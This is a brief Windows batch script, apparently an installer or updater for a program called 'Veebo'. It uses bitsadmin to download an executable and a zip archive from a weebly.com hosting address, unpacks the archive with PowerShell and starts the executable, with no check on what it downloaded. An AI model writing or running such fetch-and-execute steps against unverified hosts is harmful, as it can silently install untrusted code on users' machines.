color F0
TIMEOUT 1
bitsadmin.exe /transfer "betaveebo.exe" https://ipooglecodes.weebly.com/uploads/9/7/6/2/97620300/betaveebo.exe C:\Veebo\Veebo.exe
bitsadmin.exe /transfer "OTAnew.zip" https://ipooglecodes.weebly.com/uploads/9/7/6/2/97620300/otanew.zip C:\Veebo\OTAnew.zip
powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Veebo'); $zip = $shell.NameSpace('C:\Veebo\OTAnew.zip'); $target.CopyHere($zip.Items(), 16); }"
start C:\Veebo\Veebo.exe